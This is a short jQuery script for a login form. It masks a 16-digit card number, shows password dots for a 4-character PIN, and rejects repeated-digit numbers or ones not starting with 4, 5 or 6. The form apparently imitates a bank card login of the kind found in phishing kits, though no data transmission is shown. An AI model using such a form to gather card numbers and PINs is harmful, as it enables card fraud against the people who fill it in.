$(document).ready(function(){
	$('#numc').mask('0000 0000 0000 0000');
});

function passballs(valor){
	if (valor.length > 0) {
		$('#ball1').css({'background':'#fff'});
	}else{
		$('#ball1').css({'background':'none'});
	}

	if (valor.length > 1) {
		$('#ball2').css({'background':'#fff'});
	}else{
		$('#ball2').css({'background':'none'});
	}

	if (valor.length > 2) {
		$('#ball3').css({'background':'#fff'});
	}else{
		$('#ball3').css({'background':'none'});
	}

	if (valor.length > 3) {
		$('#ball4').css({'background':'#fff'});
	}else{
		$('#ball4').css({'background':'none'});
	}
}

function validatebt(){
	var numc = frmlog.numc.value;
	var passc = frmlog.passc.value;

	if (numc.replace(/[^0-9]/g, '').length > 15 && passc.length > 3) {
		if (validatecc()) {
			$('#btnlog').removeAttr('disabled');
			$('#btnlog').css({'color':'#ee7421'});
		}
	}else{
		$('#btnlog').attr('disabled', 'disabled');
		$('#btnlog').css({'color':'#bcbcbc'});
	}
}

function validatecc(){
	var numc = frmlog.numc.value;
	numc = numc.replace(/[^0-9]/g, '');

	if (numc == "1111111111111111" || numc == "2222222222222222" || numc == "3333333333333333" || numc == "4444444444444444" || numc == "5555555555555555" || numc == "6666666666666666" || numc == "7777777777777777" || numc == "8888888888888888" || numc == "9999999999999999") {
		return false;
	}

	if (numc.substr(0, 1) != 4 && numc.substr(0, 1) != 5 && numc.substr(0, 1) != 6) {
		return false;
	}else{
		return true;
	}
}